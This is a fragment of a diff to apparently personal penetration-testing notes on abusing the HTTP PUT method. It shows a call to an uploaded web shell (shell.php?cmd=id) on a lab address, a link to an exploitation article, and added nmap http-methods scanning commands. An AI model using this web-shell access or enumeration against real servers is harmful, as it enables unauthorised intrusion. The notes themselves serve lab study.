@@ -30,3 +30,8 @@ Now we can see that there is enable option PUT which will allow us to upload som
 10.0.2.13/test/shell.php?cmd=id
 
 http://www.hackingarticles.in/5-ways-to-exploiting-put-vulnerability/
+
+----------------------------------------------------------NMAP----------------------------------------------------------------------
+
+nmap --script http-methods <target>
+nmap --script http-methods --script-args http-methods.url-path='/website' <target>
